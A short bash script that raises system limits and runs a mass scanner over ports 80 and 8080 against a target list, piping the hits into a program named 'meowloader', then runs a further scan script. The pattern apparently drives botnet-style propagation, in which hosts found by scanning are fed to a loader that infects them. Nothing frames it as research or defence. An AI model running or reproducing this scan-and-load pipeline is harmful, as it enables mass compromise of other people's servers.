#!/bin/bash

commands=(
    'ulimit -n 999999;ulimit -u999999; ./scanner -p 80 -T6 -w mass.zone | ./meowloader 80'    
    'ulimit -n 999999;ulimit -u999999; ./scanner -p 8080 -T6 -w mass.zone | ./meowloader 8080'
    'bash scan.sh'
)

for cmd in "${commands[@]}"; do
    echo "Running command: $cmd"
    eval "$cmd"
    echo "Command finished"
done